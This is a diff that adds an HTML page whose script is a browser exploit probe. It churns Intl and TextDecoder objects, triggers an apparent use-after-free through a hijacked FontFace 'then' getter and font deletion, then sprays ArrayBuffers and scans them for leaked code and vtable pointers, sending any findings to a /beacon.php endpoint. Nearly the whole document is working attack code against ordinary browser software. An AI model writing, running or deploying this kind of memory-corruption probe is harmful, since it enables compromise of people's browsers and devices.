@@ -1,0 +1,155 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>P1143v2</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0f;color:#c8ffc8;font:11px/1.4 monospace;padding:10px;min-height:100vh}#log{white-space:pre-wrap;word-break:break-all}.ok{color:#6f6}.fail{color:#f66}.ptr{color:#f6f}.info{color:#6cf}.phase{color:#fff;font-size:13px;font-weight:bold;margin:6px 0}.win{color:#0f0;font-weight:bold;font-size:14px}</style>
+</head><body><div id="log"></div>
+<script>
+var L=document.getElementById('log');
+function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);}
+function B(t,d){try{new Image().src='/beacon.php?tag='+encodeURIComponent(t)+'&data='+encodeURIComponent(d||'')+'&_='+Math.random();}catch(e){}}
+function hex64(v){if(typeof v==='bigint'){var s=v.toString(16);while(s.length<16)s='0'+s;return'0x'+s;}return'0x0';}
+
+log('phase','=== P1143v2: INTL ICU VTABLE (SLIM) ===');
+log('info','Lighter: 30 NF + 30 DTF + 30 Col + 30 TD, gentle GC');
+B('P1143V2-START','t='+Date.now());
+
+// ===== Create Intl objects (fewer, lighter) =====
+var objs=[];
+var locales=['en-US','de-DE','ja-JP','zh-CN','ar-SA'];
+try{
+  for(var i=0;i<30;i++)
+    objs.push(new Intl.NumberFormat(locales[i%5],{style:'decimal',minimumFractionDigits:i%3}));
+  for(var i=0;i<30;i++)
+    objs.push(new Intl.DateTimeFormat(locales[i%5],{dateStyle:['full','long','medium','short'][i%4]}));
+  for(var i=0;i<30;i++)
+    objs.push(new Intl.Collator(locales[i%5],{sensitivity:['base','accent','case','variant'][i%4]}));
+}catch(e){log('fail','Intl: '+e.message);}
+
+// TextDecoder
+try{
+  var encs=['utf-8','iso-8859-1','windows-1252','euc-jp','shift_jis'];
+  for(var i=0;i<30;i++) try{objs.push(new TextDecoder(encs[i%5]));}catch(e2){}
+}catch(e){}
+
+log('ok','Created '+objs.length+' objects');
+
+// Exercise
+try{
+  for(var i=0;i<objs.length;i++){
+    var o=objs[i];
+    if(o.format) try{o.format(12345.67);}catch(e){}
+    if(o.compare) try{o.compare('a','b');}catch(e){}
+    if(o.decode) try{o.decode(new Uint8Array([65,66,67]));}catch(e){}
+  }
+}catch(e){}
+
+// Null everything
+for(var i=0;i<objs.length;i++) objs[i]=null;
+objs=null;
+
+// Gentle GC (fewer rounds, smaller allocs)
+for(var gc=0;gc<8;gc++){
+  var t=[];
+  for(var i=0;i<2000;i++) t.push(new ArrayBuffer(64));
+  t=null;
+}
+log('ok','GC done');
+B('P1143V2-GC','done');
+
+// ===== UAF + multi-size spray =====
+var r=Date.now()%100000;
+var uafHit=false;
+var allSpray={};
+var SIZES=[48,64,96,128,160,192,256,384,512,768,1024];
+for(var si=0;si<SIZES.length;si++) allSpray[SIZES[si]]=[];
+
+var st=document.createElement('style');
+st.textContent="@font-face{font-family:i"+r+";src:local(Arial);unicode-range:U+0042}";
+document.head.appendChild(st);
+var ff=new FontFace('j'+r,'local(Helvetica)',{unicodeRange:'U+0041'});
+document.fonts.add(ff);void ff.loaded;
+
+Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+  if(uafHit)return undefined;uafHit=true;
+  if(st.parentNode)st.remove();
+  try{document.fonts.delete(this);}catch(e){}
+  document.body.offsetHeight;
+
+  var PER=40;
+  for(var si=0;si<SIZES.length;si++){
+    var sz=SIZES[si];
+    for(var k=0;k<PER;k++) allSpray[sz].push(new ArrayBuffer(sz));
+  }
+  try{document.fonts.check('1em i'+r);}catch(e){}
+  return undefined;
+},set:function(){}});
+
+document.fonts.load('1em j'+r+', i'+r,'AB').then(function(){},function(){});
+
+setTimeout(function(){
+  delete FontFace.prototype.then;
+  log('phase','--- Scanning ---');
+
+  var totalNZ=0,vtableHits=[],cffFound=false;
+
+  for(var si=0;si<SIZES.length;si++){
+    var sz=SIZES[si];
+    var bufs=allSpray[sz];
+    var nzCount=0;
+
+    for(var k=0;k<bufs.length;k++){
+      var v=new BigUint64Array(bufs[k]);
+      var hasNZ=false;
+      for(var q=0;q<v.length;q++){if(v[q]!==0n){hasNZ=true;break;}}
+      if(!hasNZ) continue;
+      nzCount++;
+
+      var dump=[];
+      for(var q=0;q<Math.min(v.length,8);q++) dump.push('q'+q+'='+hex64(v[q]));
+
+      var q0=v[0];var q0hi=Number(q0>>32n);
+
+      // CSSFontFace
+      if(sz===192&&q0===1n&&v.length>11&&v[11]!==0n){
+        var h11=Number(v[11]>>32n);
+        if(h11>=0x10&&h11<=0xFF){
+          cffFound=true;
+          B('P1143V2-CFF','q11='+hex64(v[11])+'|q13='+hex64(v[13]));
+          log('ok','CSSFontFace: q11='+hex64(v[11]));
+          continue;
+        }
+      }
+
+      // Scan for code-range pointers in ALL qwords
+      var codeQ=[];
+      for(var q=0;q<v.length;q++){
+        var val=v[q];
+        if(val===0n) continue;
+        var hi=Number(val>>32n);
+        var lo=Number(val&0xFFFFFFFFn);
+        // Code: hi=0x01-0x0F, or hi=0 with lo>=1MB
+        if((hi>=1&&hi<=0xF)||(hi===0&&lo>=0x100000)){
+          codeQ.push({q:q,v:hex64(val)});
+        }
+      }
+
+      if(codeQ.length>0){
+        vtableHits.push({sz:sz,k:k,codeQ:codeQ});
+        log('win','CODE! sz='+sz+' k='+k);
+        for(var ci=0;ci<Math.min(codeQ.length,4);ci++)
+          log('win','  q'+codeQ[ci].q+'='+codeQ[ci].v);
+        B('P1143V2-CODE-'+sz+'-'+k,JSON.stringify(codeQ.slice(0,5)));
+      }
+
+      if(nzCount<=2) B('P1143V2-NZ-'+sz+'-'+k,dump.join('|'));
+    }
+
+    if(nzCount>0){
+      totalNZ+=nzCount;
+      log('info','sz='+sz+': '+nzCount+'/'+bufs.length+' non-zero');
+    }
+  }
+
+  B('P1143V2-DONE','total_nz='+totalNZ+'|code='+vtableHits.length+'|cff='+cffFound);
+  log('phase','=== DONE: '+totalNZ+' non-zero, '+vtableHits.length+' code ptrs ===');
+  if(vtableHits.length>0) log('win','!!! CODE POINTERS FOUND !!!');
+},20);
+</script></body></html>
